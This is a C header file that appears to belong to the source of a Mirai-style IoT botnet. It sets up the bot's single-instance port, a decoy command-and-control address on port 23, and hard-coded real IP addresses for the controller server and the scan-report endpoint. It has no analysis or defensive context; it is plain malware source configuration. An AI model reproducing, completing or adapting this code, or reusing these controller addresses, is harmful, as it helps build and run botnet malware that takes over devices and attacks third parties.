#pragma once
#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define FALSE 0
#define TRUE 1
typedef char BOOL;
typedef uint32_t ipv4_t;
typedef uint16_t port_t;
#define SINGLE_INSTANCE_PORT 22369
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define FAKE_CNC_ADDR INET_ADDR(128,199,47,169)
#define FAKE_CNC_PORT 23
#define SIP 1926
#ifndef USEDOMAIN
#define SCANIP (int)inet_addr((const char*)"78.142.18.92");
#define SERVIP (int)inet_addr((const char*)"78.142.18.92");
#else
#define SCANDOM "78.142.18.92"
#define SERVDOM "78.142.18.92"
#define SCANIP (int)inet_addr((const char*)"78.142.18.92");
#define SERVIP (int)inet_addr((const char*)"78.142.18.92");
#endif
ipv4_t LOCAL_ADDR;
